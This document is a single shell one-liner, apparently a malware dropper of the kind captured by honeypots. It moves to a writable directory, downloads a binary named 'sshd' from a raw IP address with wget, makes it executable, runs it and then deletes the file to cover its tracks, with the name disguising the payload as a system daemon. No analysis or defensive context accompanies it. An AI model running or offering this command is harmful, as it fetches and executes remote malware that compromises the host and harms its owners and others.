cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://138.197.101.240/sshd; chmod +x sshd; ./sshd; rm -rf sshd
